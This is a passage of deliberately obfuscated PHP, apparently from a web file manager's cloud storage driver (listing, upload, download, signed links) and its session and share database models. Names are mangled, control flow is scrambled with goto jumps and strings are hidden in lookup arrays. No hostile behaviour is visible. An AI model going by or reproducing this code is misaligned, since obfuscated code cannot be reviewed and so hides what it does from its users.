$bÈÌ¨‹ùåœ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Câ–™±ã½¯ = array($bÈÌ¨‹ùåœ[28] => $this->pathThis($fìã“°½Êà), $bÈÌ¨‹ùåœ[75] => $this->getPathOuter($fìã“°½Êà), $bÈÌ¨‹ùåœ[29] => $bÈÌ¨‹ùåœ[173], $bÈÌ¨‹ùåœ[167] => $this->ext($fìã“°½Êà), $bÈÌ¨‹ùåœ[77] => isset($C—ˆÜ¹â¡ğ[$bÈÌ¨‹ùåœ[77]]) ? $C—ˆÜ¹â¡ğ[$bÈÌ¨‹ùåœ[77]] : 0); if ($B‘…àºƒµ¶) { return $Câ–™±ã½¯; } goto c²”¥¡©è¨; c²”¥¡©è¨: $Câ–™±ã½¯[$bÈÌ¨‹ùåœ[192]] = $Câ–™±ã½¯[$bÈÌ¨‹ùåœ[83]] = 0; $Câ–™±ã½¯[$bÈÌ¨‹ùåœ[193]] = $Câ–™±ã½¯[$bÈÌ¨‹ùåœ[194]] = !0; if (empty($C—ˆÜ¹â¡ğ)) { $C—ˆÜ¹â¡ğ = $this->objectMeta($fìã“°½Êà); if (!$C—ˆÜ¹â¡ğ) { return $Câ–™±ã½¯; } } goto eÌğ¤ÖŞ†å; Fï¬¢ï­µ‹: } private function folderInfo($E§Á½ƒ‘ï, $F´—…¹ = false) { goto C‰­ÇÕ†¥; AÉÜË’¥÷ê: $E§Á½ƒ‘ï = trim($E§Á½ƒ‘ï, $aì³ëÎÖ·á[8]) . $aì³ëÎÖ·á[8]; $f„‡é™ç® = $this->objectMeta($E§Á½ƒ‘ï); if (isset($f„‡é™ç®[$aì³ëÎÖ·á[195]])) { $e¦¤ì ÷Õ[$aì³ëÎÖ·á[192]] = $f„‡é™ç®[$aì³ëÎÖ·á[195]]; } goto f‰Š½ÓÈ; C‰­ÇÕ†¥: $aì³ëÎÖ·á =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e¦¤ì ÷Õ = array($aì³ëÎÖ·á[28] => $this->pathThis($E§Á½ƒ‘ï), $aì³ëÎÖ·á[75] => $this->getPathOuter($aì³ëÎÖ·á[8] . $E§Á½ƒ‘ï), $aì³ëÎÖ·á[29] => $aì³ëÎÖ·á[76]); if ($F´—…¹) { return $e¦¤ì ÷Õ; } goto a¬Œ‘Œ‚”; f‰Š½ÓÈ: return $e¦¤ì ÷Õ; goto AŞÎª—Í°³; a¬Œ‘Œ‚”: $e¦¤ì ÷Õ[$aì³ëÎÖ·á[192]] = $e¦¤ì ÷Õ[$aì³ëÎÖ·á[83]] = 0; $e¦¤ì ÷Õ[$aì³ëÎÖ·á[193]] = $e¦¤ì ÷Õ[$aì³ëÎÖ·á[194]] = !0; if ($E§Á½ƒ‘ï == $aì³ëÎÖ·á[33]) { return $e¦¤ì ÷Õ; } goto AÉÜË’¥÷ê; AŞÎª—Í°³: } private function fileList($DÍÄê£‘—, $dÁÖ”‰ï¡¥ = '', $a™ÅÙç¯¾• = 0) { goto f˜Óì‚Ş‘™; Eçêİîá¡: if (!$d¦‰ğŸ¯Î) { return array($A¼¼´ø¦ØÜ[74] => array(), $A¼¼´ø¦ØÜ[73] => array()); } $BÌ„‘ï¦ „ = $this->listItemCache === !1 ? !1 : !0; $Aøïò¦ò…‚ = $DòÛŠ‘‰ËŸ = array(); goto e«¤²ËÈô¤; FôÀ³÷Õçø: return array($A¼¼´ø¦ØÜ[74] => $Aøïò¦ò…‚, $A¼¼´ø¦ØÜ[73] => $DòÛŠ‘‰ËŸ); goto eæÍğÑ‘Ÿë; f˜Óì‚Ş‘™: $A¼¼´ø¦ØÜ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cÅŠò¡ä× = rtrim($DÍÄê£‘—, $A¼¼´ø¦ØÜ[8]) . $A¼¼´ø¦ØÜ[8]; $d¦‰ğŸ¯Î = $this->listObjs($cÅŠò¡ä×, null, null, $dÁÖ”‰ï¡¥); goto Eçêİîá¡; e«¤²ËÈô¤: foreach ($d¦‰ğŸ¯Î[$A¼¼´ø¦ØÜ[196]] as $DšØ¹Ş–¸¥) { goto CÙ¾¾Á˜¨; CÙ¾¾Á˜¨: $BğªÑ¥¼“§ = $DšØ¹Ş–¸¥[$A¼¼´ø¦ØÜ[28]]; if ($BğªÑ¥¼“§ == $cÅŠò¡ä×) { continue; } $eï—á¤½Ãí = isset($DšØ¹Ş–¸¥[$A¼¼´ø¦ØÜ[77]]) ? $DšØ¹Ş–¸¥[$A¼¼´ø¦ØÜ[77]] : 0; goto fØÌ¬Ä­ñ»; B·’âÛ¼ïË: $DòÛŠ‘‰ËŸ[] = $a™ÅÙç¯¾• ? $DšØ¹Ş–¸¥ : $BğªÑ¥¼“§; goto Eåº«ÆÚ; fØÌ¬Ä­ñ»: $bìñŠñí‘© = $eï—á¤½Ãí == 0 && substr($BğªÑ¥¼“§, strlen($BğªÑ¥¼“§) - 1, 1) == $A¼¼´ø¦ØÜ[8] ? !0 : !1; if ($BÌ„‘ï¦ „) { $this->cacheMethod($A¼¼´ø¦ØÜ[197], $BğªÑ¥¼“§, $bìñŠñí‘©); $this->cacheMethod($A¼¼´ø¦ØÜ[198], $BğªÑ¥¼“§, $DšØ¹Ş–¸¥); } if ($bìñŠñí‘©) { $Aøïò¦ò…‚[] = $BğªÑ¥¼“§; continue; } goto B·’âÛ¼ïË; Eåº«ÆÚ: } foreach ($d¦‰ğŸ¯Î[$A¼¼´ø¦ØÜ[199]] as $DšØ¹Ş–¸¥) { $Aøïò¦ò…‚[] = $DšØ¹Ş–¸¥[$A¼¼´ø¦ØÜ[28]]; if ($BÌ„‘ï¦ „) { $this->cacheMethod($A¼¼´ø¦ØÜ[197], $DšØ¹Ş–¸¥[$A¼¼´ø¦ØÜ[28]], !0); } } if ($BÌ„‘ï¦ „) { $this->cacheMethod($A¼¼´ø¦ØÜ[197], $DÍÄê£‘—, !0); } goto FôÀ³÷Õçø; eæÍğÑ‘Ÿë: } private function listObjs($EÄçš­®†, $aà¿Ó‡²§– = null, $a£æ² à¹ = null, $B„ä‹˜İ’è = null) { $b¶å¡¯Åšø =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EÄçš­®† = trim($EÄçš­®†, $b¶å¡¯Åšø[8]); $d¯ñ¶° Ú = empty($EÄçš­®†) ? $b¶å¡¯Åšø[33] : $EÄçš­®† . $b¶å¡¯Åšø[8]; return $this->client->getBucket($this->bucket, $d¯ñ¶° Ú, $aà¿Ó‡²§–, $a£æ² à¹, $B„ä‹˜İ’è, !0); } public function has($Eäøö¼ƒá, $Dø°¼É·Œ = false, $dö Ì“ŞÁ = true) { goto BÄ±¥„Õˆ°; b‚’º°±¿¥: return !1; goto fÀ½ô¢ëĞ; f¥îî·ô: $fœø“Î×®Ü = null; $e¨•áœïĞ = 500; $aâŸêî¶ò = $Fäõí™‰²°[8]; goto a¯Ğ‘è‡×õ; a¯Ğ‘è‡×õ: $bíè¾æíÔÉ = $c—‰çãğÀ„ = array(); while (!0) { $FÄŞñ¼è„‚ = $this->listObjs($Eäøö¼ƒá, $fœø“Î×®Ü, $e¨•áœïĞ, $aâŸêî¶ò); if (!$FÄŞñ¼è„‚) { break; } $fœø“Î×®Ü = $FÄŞñ¼è„‚[$Fäõí™‰²°[200]]; $aè”Ù½øø = $FÄŞñ¼è„‚[$Fäõí™‰²°[196]]; $dèäáÖ¥Ñ = $FÄŞñ¼è„‚[$Fäõí™‰²°[199]]; if (empty($aè”Ù½øø) && empty($dèäáÖ¥Ñ)) { break; } if (count($aè”Ù½øø) == 1 && $aè”Ù½øø[0][$Fäõí™‰²°[28]] == $eºÑ¶§”°’) { break; } if ($Dø°¼É·Œ) { if (count($aè”Ù½øø)) { $aè”Ù½øø = array_column($aè”Ù½øø, $Fäõí™‰²°[28]); $bíè¾æíÔÉ = array_merge($bíè¾æíÔÉ, $aè”Ù½øø); } if (count($dèäáÖ¥Ñ)) { $dèäáÖ¥Ñ = array_column($dèäáÖ¥Ñ, $Fäõí™‰²°[28]); $c—‰çãğÀ„ = array_merge($c—‰çãğÀ„, $dèäáÖ¥Ñ); } if ($fœø“Î×®Ü === null) { break; } continue; } if ($dö Ì“ŞÁ) { if (!empty($aè”Ù½øø)) { if (count($aè”Ù½øø) > 1 || isset($aè”Ù½øø[0][$Fäõí™‰²°[28]]) && $aè”Ù½øø[0][$Fäõí™‰²°[28]] != $eºÑ¶§”°’) { return !0; } } } else { if (!empty($dèäáÖ¥Ñ)) { return !0; } } if ($fœø“Î×®Ü === null) { break; } } if ($Dø°¼É·Œ) { $bíè¾æíÔÉ = array_diff($bíè¾æíÔÉ, array($eºÑ¶§”°’)); $bíè¾æíÔÉ = count(array_unique($bíè¾æíÔÉ)); $c—‰çãğÀ„ = count(array_unique($c—‰çãğÀ„)); return array($Fäõí™‰²°[201] => $bíè¾æíÔÉ, $Fäõí™‰²°[202] => $c—‰çãğÀ„); } goto b‚’º°±¿¥; BÄ±¥„Õˆ°: $Fäõí™‰²° =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eäøö¼ƒá = trim($Eäøö¼ƒá, $Fäõí™‰²°[8]); $eºÑ¶§”°’ = empty($Eäøö¼ƒá) ? $Fäõí™‰²°[33] : $Eäøö¼ƒá . $Fäõí™‰²°[8]; goto f¥îî·ô; fÀ½ô¢ëĞ: } public function listAll($D‚ÎÉ Ø¯›) { $E¢òì¯¬™“ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÍä…ãĞî¿ = $this->fileList($D‚ÎÉ Ø¯›, $E¢òì¯¬™“[33], !0); $d§¹ÇÔ’¢ = array(); foreach ($eÍä…ãĞî¿[$E¢òì¯¬™“[73]] as $fÊ×ğ°—Óİ) { $d§¹ÇÔ’¢[$fÊ×ğ°—Óİ[$E¢òì¯¬™“[28]]] = $fÊ×ğ°—Óİ[$E¢òì¯¬™“[77]]; } foreach ($eÍä…ãĞî¿[$E¢òì¯¬™“[74]] as $fÊ×ğ°—Óİ) { if (is_string($fÊ×ğ°—Óİ)) { $d§¹ÇÔ’¢[$fÊ×ğ°—Óİ] = 0; } } return $this->listAllFiles($D‚ÎÉ Ø¯›, array_keys($d§¹ÇÔ’¢), $d§¹ÇÔ’¢); } public function canRead($cÙÇÇ°Ïß„) { $cµ³¶š İ¯ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Fí‡Ÿ³ƒÀ = $this->client->getAccessControlPolicy($this->bucket, $cÙÇÇ°Ïß„); if (!$Fí‡Ÿ³ƒÀ) { return !1; } return in_array($Fí‡Ÿ³ƒÀ, array($cµ³¶š İ¯[203], $cµ³¶š İ¯[204], $cµ³¶š İ¯[205])) ? !0 : !1; } public function canWrite($e˜ÛáãËÌÊ) { $c¹¢Ò°’„¯ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dë‘¨¶Ïƒ = $this->client->getAccessControlPolicy($this->bucket, $e˜ÛáãËÌÊ); if (!$dë‘¨¶Ïƒ) { return !1; } return in_array($dë‘¨¶Ïƒ, array($c¹¢Ò°’„¯[203], $c¹¢Ò°’„¯[204])) ? !0 : !1; } public function getContent($DÎ¶Á¹«à) { return $this->client->getObject($this->bucket, $DÎ¶Á¹«à); } public function setContent($A¨Ë°×ÀŸà, $B¤‰ÑÛ ğ = '', $Eˆ·°¶ºÒê = false) { goto BÁê´è²Ä; BÁê´è²Ä: $d‘ÎÀÙå‘ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A¨Ë°×ÀŸà = $Eˆ·°¶ºÒê ? trim($A¨Ë°×ÀŸà, $d‘ÎÀÙå‘[8]) . $d‘ÎÀÙå‘[8] : $A¨Ë°×ÀŸà; $D»«Äà—Àó = get_file_mime(get_path_ext($A¨Ë°×ÀŸà)); goto FÂ ÕÌÊŸÈ; FÂ ÕÌÊŸÈ: $C˜¸‚”˜Ÿù = $this->client->putObject($B¤‰ÑÛ ğ, $this->bucket, $A¨Ë°×ÀŸà, $d‘ÎÀÙå‘[191], array(), $D»«Äà—Àó); if (!$C˜¸‚”˜Ÿù) { return !1; } if ($Eˆ·°¶ºÒê) { return !0; } goto BÁ†¤Ö‹›µ; BÁ†¤Ö‹›µ: $this->cacheMethod(null, null); $C˜¸‚”˜Ÿù = $this->copyFile($A¨Ë°×ÀŸà, $A¨Ë°×ÀŸà, array($d‘ÎÀÙå‘[206] => $C˜¸‚”˜Ÿù[$d‘ÎÀÙå‘[207]])); return $C˜¸‚”˜Ÿù ? !0 : !1; goto d‡ƒ½ÏÆï; d‡ƒ½ÏÆï: } public function fileSubstr($A´°Ü„†¬–, $aÓ½œ÷î›Ó, $BŞ†õÊé ¤) { $a¾ôÀ¤µøÉ = $aÓ½œ÷î›Ó + $BŞ†õÊé ¤ - 1; return $this->client->getObject($this->bucket, $A´°Ü„†¬–, array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][208] => "\142\171\164\145\x73\x3d{$aÓ½œ÷î›Ó}\55{$a¾ôÀ¤µøÉ}")); } public function upload($AŞëË›öÌù, $FÍ‹‘ÀÅÂ¦, $dğÍŞ¹Æ£“ = false, $Dì©íƒ¿Ôõ = REPEAT_REPLACE) { $Eœ•óå‡˜™ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d‚ßÓ¡²¥¡ = array($Eœ•óå‡˜™[206] => @md5_file($FÍ‹‘ÀÅÂ¦)); $DÂì¬°±­œ = array($Eœ•óå‡˜™[209] => get_file_mime(get_path_ext($AŞëË›öÌù))); if (IO::size($FÍ‹‘ÀÅÂ¦) <= 1024 * 1024 * 200) { $AîºõšÍœâ = $this->client->putObjectFile($FÍ‹‘ÀÅÂ¦, $this->bucket, $AŞëË›öÌù, $Eœ•óå‡˜™[191], $d‚ßÓ¡²¥¡, $DÂì¬°±­œ); return !empty($AîºõšÍœâ) ? $this->getPathOuter($AŞëË›öÌù) : !1; } $eš“Ò®âæÀ = $this->client->multiUploadObject($FÍ‹‘ÀÅÂ¦, $this->bucket, trim($AŞëË›öÌù, $Eœ•óå‡˜™[8]), $d‚ßÓ¡²¥¡, $DÂì¬°±­œ); return $eš“Ò®âæÀ ? $this->getPathOuter($AŞëË›öÌù) : !1; } public function download($bšƒ†ôÅ˜¼, $BãÅ²¨ˆŸ) { if (!@is_dir($this->pathFather($BãÅ²¨ˆŸ)) && !IO::mkdir($this->pathFather($BãÅ²¨ˆŸ))) { return !1; } $C§®êŠµÕ = $this->client->getObject($this->bucket, $bšƒ†ôÅ˜¼, array(), $BãÅ²¨ˆŸ); return $C§®êŠµÕ !== !1 ? $BãÅ²¨ˆŸ : !1; } public function link($B¢Ñë™øÌƒ, $bĞ•£ÙÙ‡î = array()) { $a†¦ÒÓ—‘· =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->signVer == $a†¦ÒÓ—‘·[210]) { return $this->client->getAuthenticatedURL($this->bucket, $B¢Ñë™øÌƒ, 3600 * 12, $bĞ•£ÙÙ‡î); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($B¢Ñë™øÌƒ, $a†¦ÒÓ—‘·[8]), 3600 * 12, $this->region, array(), !0, $bĞ•£ÙÙ‡î); } public function fileOut($b¤ïŸÍÄÕš, $C‰¢±¡‘É = false, $D­—ÙíÓÉá = false, $B–ªîøéÊŞ = '') { goto AòîÔäÈšö; AòîÔäÈšö: $CŞ—Ê·äŒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->isFileOutServer()) { return $this->fileOutServer($b¤ïŸÍÄÕš, $C‰¢±¡‘É, $D­—ÙíÓÉá, $B–ªîøéÊŞ); } if (!$D­—ÙíÓÉá) { $D­—ÙíÓÉá = $this->pathThis($b¤ïŸÍÄÕš); } goto e¿ˆèï–‰Û; e¿ˆèï–‰Û: $fÄàï¶“‘¨ = get_file_mime(get_path_ext($D­—ÙíÓÉá)); if ($fÄàï¶“‘¨ == $CŞ—Ê·äŒ[211]) { return parent::fileOut($b¤ïŸÍÄÕš, $C‰¢±¡‘É, $D­—ÙíÓÉá, $B–ªîøéÊŞ); } $C‰¢±¡‘É = $C‰¢±¡‘É ? $CŞ—Ê·äŒ[212] : $CŞ—Ê·äŒ[213]; goto DÓœØÎ†²æ; DÓœØÎ†²æ: $E‘¢åáÕ¯ƒ = array($CŞ—Ê·äŒ[214] => $C‰¢±¡‘É . $CŞ—Ê·äŒ[215] . rawurlencode($D­—ÙíÓÉá), $CŞ—Ê·äŒ[216] => $fÄàï¶“‘¨); $Dœõêº‹»• = $this->link($b¤ïŸÍÄÕš, $E‘¢åáÕ¯ƒ); $this->fileOutLink($Dœõêº‹»•); goto bìøøã¸†¸; bìøøã¸†¸: } public function fileOutServer($DÚ»Ş‰’, $F¸­œÀ§ù“ = false, $dÌĞÇöÁ = false, $c²ÛÜŒÓ¬ = '') { parent::fileOut($DÚ»Ş‰’, $F¸­œÀ§ù“, $dÌĞÇöÁ, $c²ÛÜŒÓ¬); } public function fileOutImageServer($d†¾¾Ï¾–ù, $Bƒ„ùäƒî = 250) { parent::fileOutImage($d†¾¾Ï¾–ù, $Bƒ„ùäƒî); } public function hashMd5($DƒÑäÁ—ŠÆ, $bÎ‘¶Ô‹Ïø = '') { $a…¸Ø±ÜÙ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eœ‹Ïà¾× = $this->objectMeta($DƒÑäÁ—ŠÆ); if (!$eœ‹Ïà¾×) { return !1; } $bÎ‘¶Ô‹Ïø = $bÎ‘¶Ô‹Ïø ? $bÎ‘¶Ô‹Ïø : _get($eœ‹Ïà¾×, $a…¸Ø±ÜÙ[217]); $bÎ‘¶Ô‹Ïø = $bÎ‘¶Ô‹Ïø ? $bÎ‘¶Ô‹Ïø : _get($eœ‹Ïà¾×, $a…¸Ø±ÜÙ[207], $a…¸Ø±ÜÙ[33]); return $bÎ‘¶Ô‹Ïø; } public function uploadFormData($A—Ö³‘¥©æ, $EìÀ÷©Üã“ = 3600) { $C¢‹»¬‡‘Ë =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cÀÂÀ…„– = $this->pathFather($A—Ö³‘¥©æ); $CÕ¡‡‹µÑ« = $this->client->getHttpUploadPostParams($this->bucket, $cÀÂÀ…„–, $C¢‹»¬‡‘Ë[191], $EìÀ÷©Üã“); return array_merge((array) $CÕ¡‡‹µÑ«, array($C¢‹»¬‡‘Ë[175] => $this->getHost())); } public function multiUploadFormData($c«»›«Í¡®, $d²—‰“¤Ş‰ = 3600) { $DŒâëÍ©ù =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Bõ×ŒŒ°àë = gmdate($DŒâëÍ©ù[218]); $FÅ¿®×ƒ‘ = array(); $c•›Ş Ïå¿ = $this->client->getUploadId($this->bucket, $c«»›«Í¡®, $FÅ¿®×ƒ‘); if (!$c•›Ş Ïå¿) { return !1; } return array($DŒâëÍ©ù[219] => $c•›Ş Ïå¿, $DŒâëÍ©ù[175] => $this->getHost() . $DŒâëÍ©ù[8] . $this->pathEncode($c«»›«Í¡®), $DŒâëÍ©ù[220] => $Bõ×ŒŒ°àë, $DŒâëÍ©ù[92] => $c«»›«Í¡®); } public function multiUploadAuthData($fñÈ½Ñ‘ñà, $CƒÚÕºŸ¼ = array()) { goto f»êß¢ã·ğ; eĞ«˜Óß¢Ä: if (strpos($b‘°¾¹Òßœ, $D»—Ç‡Œ‚Î[223]) === 0) { return array($D»—Ç‡Œ‚Î[230] => $DîÕ ‡ƒËÙ, $D»—Ç‡Œ‚Î[220] => $C´µ¤¾Ê²); } return $DîÕ ‡ƒËÙ; goto EÖó¼Ô›»™; e¬±Æç¯: $d²í”Ä‹”¼ = array($D»—Ç‡Œ‚Î[222], $D»—Ç‡Œ‚Î[33], $D»—Ç‡Œ‚Î[118], $D»—Ç‡Œ‚Î[33], "\170\x2d\141\155\x7a\55\144\141\164\x65\x3a{$C´µ¤¾Ê²}", $D»—Ç‡Œ‚Î[8] . $this->bucket . $D»—Ç‡Œ‚Î[8] . $this->pathEncode($Ešé÷Îñò°) . $b‘°¾¹Òßœ); if (strpos($b‘°¾¹Òßœ, $D»—Ç‡Œ‚Î[223]) === 0) { $d²í”Ä‹”¼[0] = $D»—Ç‡Œ‚Î[224]; } if (isset($CƒÚÕºŸ¼[$D»—Ç‡Œ‚Î[225]]) && $CƒÚÕºŸ¼[$D»—Ç‡Œ‚Î[225]] == $D»—Ç‡Œ‚Î[226]) { $d²í”Ä‹”¼[0] = $D»—Ç‡Œ‚Î[226]; } goto Cïé—¹İÚŸ; f»êß¢ã·ğ: $D»—Ç‡Œ‚Î =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C´µ¤¾Ê² = isset($CƒÚÕºŸ¼[$D»—Ç‡Œ‚Î[220]]) ? $CƒÚÕºŸ¼[$D»—Ç‡Œ‚Î[220]] : gmdate($D»—Ç‡Œ‚Î[218]); $b‘°¾¹Òßœ = isset($CƒÚÕºŸ¼[$D»—Ç‡Œ‚Î[167]]) ? $CƒÚÕºŸ¼[$D»—Ç‡Œ‚Î[167]] : $D»—Ç‡Œ‚Î[33]; goto D¶æµ£Í„÷; D¶æµ£Í„÷: $Ešé÷Îñò° = $CƒÚÕºŸ¼[$D»—Ç‡Œ‚Î[92]]; unset($CƒÚÕºŸ¼[$D»—Ç‡Œ‚Î[92]]); if (isset($CƒÚÕºŸ¼[$D»—Ç‡Œ‚Î[221]])) { $CƒÚÕºŸ¼[$D»—Ç‡Œ‚Î[220]] = $C´µ¤¾Ê²; return $this->listUploadParts($Ešé÷Îñò°, $CƒÚÕºŸ¼); } goto e¬±Æç¯; Cïé—¹İÚŸ: $d¯óÁäõÛ = implode($D»—Ç‡Œ‚Î[227], $d²í”Ä‹”¼); $c¡ «æ ’ = base64_encode(hash_hmac($D»—Ç‡Œ‚Î[228], $d¯óÁäõÛ, $this->secret, !0)); $DîÕ ‡ƒËÙ = $D»—Ç‡Œ‚Î[229] . $this->accessKey . $D»—Ç‡Œ‚Î[4] . $c¡ «æ ’; goto eĞ«˜Óß¢Ä; EÖó¼Ô›»™: } public function listUploadParts($aóØ§”¼í›, $b¥öÆÊÜµ½ = array()) { goto B¸æŞ®Ü¬š; dÚÊØèÍª: $C»Ü¸Æ­±Ó = $this->multiUploadAuthData($aóØ§”¼í›, $b¥öÆÊÜµ½); if (empty($C»Ü¸Æ­±Ó)) { return !1; } return array($AƒÜ•øÏ©§[230] => $C»Ü¸Æ­±Ó, $AƒÜ•øÏ©§[220] => $b¥öÆÊÜµ½[$AƒÜ•øÏ©§[220]], $AƒÜ•øÏ©§[232] => $b”£·¾±Æ); goto bâ­ì­â•¡; F”¸«Ú³½ñ: if (!$b”£·¾±Æ) { return !1; } unset($b¥öÆÊÜµ½[$AƒÜ•øÏ©§[221]], $b¥öÆÊÜµ½[$AƒÜ•øÏ©§[225]]); $b¥öÆÊÜµ½[$AƒÜ•øÏ©§[92]] = $aóØ§”¼í›; goto dÚÊØèÍª; B¸æŞ®Ü¬š: $AƒÜ•øÏ©§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E°èĞğ†®ç = str_replace($AƒÜ•øÏ©§[231], $AƒÜ•øÏ©§[33], $b¥öÆÊÜµ½[$AƒÜ•øÏ©§[167]]); $b”£·¾±Æ = $this->client->listParts($this->bucket, $aóØ§”¼í›, $E°èĞğ†®ç); goto F”¸«Ú³½ñ; bâ­ì­â•¡: } public function getHost() { return parent::getHost() . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][8] . $this->bucket; } public function size($cÚ¦ùÒƒ‹ˆ) { $E¸›‚Ñ—á§ = $this->objectMeta($cÚ¦ùÒƒ‹ˆ); return $E¸›‚Ñ—á§ ? $E¸›‚Ñ—á§[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]] : 0; } public function info($eîÉ“Èá¦) { if ($this->isFolder($eîÉ“Èá¦)) { return $this->folderInfo($eîÉ“Èá¦); } else { if ($this->isFile($eîÉ“Èá¦)) { return $this->fileInfo($eîÉ“Èá¦); } } return !1; } public function exist($d‡±´‹Şª¤) { return $this->isFile($d‡±´‹Şª¤) || $this->isFolder($d‡±´‹Şª¤); } public function isFile($fØ¬è¸ß¤”) { return !$this->isFolder($fØ¬è¸ß¤”) && $this->objectMeta($fØ¬è¸ß¤”); } public function isFolder($C×ìî›‰ÏÄ) { return $this->cacheMethod($_SERVER[ó¬â¥‰ÊÔ¤Ç£][197], $C×ìî›‰ÏÄ); } protected function objectMeta($ağ«Õæ–‡ñ) { return $this->cacheMethod($_SERVER[ó¬â¥‰ÊÔ¤Ç£][198], $ağ«Õæ–‡ñ); } protected function _objectMeta($d›†ïŠ¨) { $dØ­¼ó‰»ç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d›†ïŠ¨ = rtrim($d›†ïŠ¨, $dØ­¼ó‰»ç[8]); try { $DáæíÜËÕˆ = $this->client->getObjectInfo($this->bucket, $d›†ïŠ¨); if (!isset($DáæíÜËÕˆ[$dØ­¼ó‰»ç[217]]) && isset($DáæíÜËÕˆ[$dØ­¼ó‰»ç[233]])) { $DáæíÜËÕˆ[$dØ­¼ó‰»ç[217]] = $DáæíÜËÕˆ[$dØ­¼ó‰»ç[233]]; } } catch (Exception $cæè¤Õô¬®) { $DáæíÜËÕˆ = !1; } if (!$DáæíÜËÕˆ) { } return $DáæíÜËÕˆ; } protected function _isFolder($DÌ–µÓªĞ) { goto fÊÒÌİ˜Ô•; dÕß˜Ãñ°‰: $aÅÊÈËµõ­ = $this->client->getBucket($this->bucket, $DÌ–µÓªĞ, null, 1); if (empty($aÅÊÈËµõ­[$a²Ïºß¨Ì[196]])) { return !1; } $FôŠè¿´ëò = $aÅÊÈËµõ­[$a²Ïºß¨Ì[196]][0][$a²Ïºß¨Ì[28]]; goto DÆËä†Úïø; fÊÒÌİ˜Ô•: $a²Ïºß¨Ì =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÌ–µÓªĞ = rtrim($DÌ–µÓªĞ, $a²Ïºß¨Ì[8]); if ($DÌ–µÓªĞ == $a²Ïºß¨Ì[33] || $DÌ–µÓªĞ == $a²Ïºß¨Ì[8]) { return !0; } goto dÕß˜Ãñ°‰; DÆËä†Úïø: if (substr($FôŠè¿´ëò, -1) == $a²Ïºß¨Ì[8]) { return !0; } if (get_path_this($FôŠè¿´ëò) == get_path_this($DÌ–µÓªĞ)) { return !1; } return !0; goto f˜Ø±‡¥Ä™; f˜Ø±‡¥Ä™: } } define($_SERVER[ó¬â¥‰ÊÔ¤Ç£][234], 1); goto eã‡ĞŸ±ñ; F§íêÃˆŠ: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\x6d\137\x73\x65\x73\163\x69\x6f\156"; public function get($EƒÈõ¥ÊÅ‚) { $Fí¯æó‘¼ç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cê•†é‘ = $this->where(array($Fí¯æó‘¼ç[1760] => $EƒÈõ¥ÊÅ‚))->find(); if (!is_array($cê•†é‘)) { return !1; } return $cê•†é‘[$Fí¯æó‘¼ç[686]]; } public function set($E§´¥‰°ºµ, $b’Íîìç•, $Dª—ÇÛ£â = 3600) { $aäâ™¬ ‰£ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eË—…Ìó˜Û = array($aäâ™¬ ‰£[1760] => $E§´¥‰°ºµ, $aäâ™¬ ‰£[1672] => $b’Íîìç•, $aäâ™¬ ‰£[1761] => $Dª—ÇÛ£â + time()); if (Session::get($aäâ™¬ ‰£[1762])) { $eË—…Ìó˜Û[$aäâ™¬ ‰£[1479]] = Session::get($aäâ™¬ ‰£[1762]); } else { $eË—…Ìó˜Û[$aäâ™¬ ‰£[1479]] = 0; } if ($this->get($E§´¥‰°ºµ)) { return $this->where(array($aäâ™¬ ‰£[1760] => $E§´¥‰°ºµ))->save($eË—…Ìó˜Û); } else { return $this->add($eË—…Ìó˜Û, array(), !0); } } public function remove($a‰å¬Ï¬¼Ì) { return $this->where(array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1760] => $a‰å¬Ï¬¼Ì))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1763] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\146\x79\124\x69\x6d\145", "\164\151\155\x65", "\151\x6e\163\145\162\164\x2c\165\x70\x64\141\164\x65", "\146\x75\156\143\164\151\157\156"), array("\143\x72\145\x61\164\x65\x54\x69\x6d\145", "\164\x69\x6d\x65", "\151\156\x73\145\162\x74", "\146\x75\x6e\143\x74\x69\x6f\156"), array("\x6f\x70\164\x69\x6f\x6e\x73", '', "\151\x6e\x73\x65\x72\x74\54\x75\x70\x64\141\x74\145\x2c\x73\145\x6c\x65\x63\x74", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($A¡¨‹„¸Ñ”) { $F¯ä…à´œ„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fä·ÍñÈ• = isset($A¡¨‹„¸Ñ”[0]) ? $A¡¨‹„¸Ñ”[0] : !1; return array($F¯ä…à´œ„[1764] => array(USER_ID, $F¯ä…à´œ„[1765]), $F¯ä…à´œ„[1713] => array($fä·ÍñÈ•, $F¯ä…à´œ„[1766])); } protected function listSimple() { $C•›èÈ”¡¾ = array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1479] => USER_ID); $cã…ƒ†íÇ¢ = $this->field($this->fieldList)->where($C•›èÈ”¡¾)->select(); return $cã…ƒ†íÇ¢ ? $cã…ƒ†íÇ¢ : array(); } protected function 